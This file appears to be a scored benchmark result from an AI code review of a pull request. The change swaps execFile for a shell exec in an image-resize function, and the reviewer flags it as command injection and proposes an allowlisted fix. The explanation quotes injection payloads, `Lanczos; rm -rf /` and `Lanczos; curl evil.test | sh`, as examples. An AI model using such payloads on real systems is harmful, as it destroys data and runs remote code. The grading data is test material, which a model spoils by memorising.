@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 72.6,
+  "setup_seconds": 0.0,
+  "total_seconds": 72.7,
+  "usage": {
+    "in": 18744,
+    "cache_read": 103168,
+    "cache_write": 0,
+    "out": 3785,
+    "source": "cli"
+  },
+  "cost_usd": 0.0911484,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** `child_process.exec` runs the command through a shell. `src` and `filter` are interpolated into that shell string with no sanitization or allowlist. Any caller-controlled value becomes remote code execution on the host \u2014 e.g. `filter` set to `Lanczos; rm -rf /` or `src` set to a value that closes the double quote and appends shell metacharacters.\n\n**Failure mode:** Power-user composed filter expressions (per the PR description) are exactly the attack surface: metacharacters (`;`, `|`, `$()`, backticks, quotes) are interpreted by the shell before `convert` sees them. Quoting `\"${src}\"` does not help once `src` contains a double quote.\n\n**Fix:** Keep `execFile` (no shell) and pass arguments as an argv array. Validate `filter` against ImageMagick known filter names before use:\n\n```ts\nimport { execFile } from \"child_process\";\n\nconst ALLOWED_FILTERS = new Set([\"Lanczos\", \"Mitchell\", \"Catrom\", \"Cubic\", \"Triangle\", \"Point\"]);\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  if (!ALLOWED_FILTERS.has(filter)) {\n    return Promise.reject(new Error(`unsupported filter: ${filter}`));\n  }\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) =>\n      e ? rej(e) : res(\"/tmp/out.png\")\n    );\n  });\n}\n```\n\nA shell is not required for `-filter`; it is a single argv token."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Issue:** `resize(src, w)` became `resize(src, filter, w)`. Existing callers that still pass `(src, w)` will treat the numeric width as `filter` and leave `w` undefined, producing a broken `-resize undefinedx` invocation (and, with the new `exec` path, stringifying unexpected values into the shell).\n\n**Fix:** If backward compatibility matters, add an overload or put `filter` last with a default (`filter = \"Lanczos\"`). No in-repo callers were found, but this is still a public export."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by replacing `execFile` with shell `exec` and interpolating caller-controlled strings into the command line.\n\n## Narrative\n\n`resize` previously invoked ImageMagick via `execFile` with an argv array, which does not invoke a shell. The new code builds a single shell string:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nBoth `src` and `filter` are untrusted string parameters. A value such as `filter = \"Lanczos; curl evil.test | sh\"` or a `src` that embeds double quotes runs arbitrary commands on the host. Double-quoting `src` does not stop breakout via embedded quotes, and `filter` is entirely unquoted.\n\nThe comment claims a shell is required for user-composed filter expressions. ImageMagick `-filter` accepts a filter name (e.g. `Lanczos`, `Mitchell`) as a normal argv token. Keep `execFile` and pass `filter` as its own argument after validating it against an allowlist of known filter names.\n\nSecondary note: the function signature changed from `(src, w)` to `(src, filter, w)`, which is a breaking API change for any downstream caller. No in-repo callers were found, but external consumers would break at compile or runtime.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "round": "full",
+  "effective_max_turns": 30,
+  "budget": {
+    "tier": "standard",
+    "profile": "fixed",
+    "turns": 30,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": false
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code uses child_process.exec with unsanitized src and filter interpolated into a shell command string; base used execFile with an argv array. That is a real shell-injection/RCE regression, so critical severity is warranted."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 10.243,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 1619,
+      "out": 430
+    },
+    "cost_usd": 0.007098
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
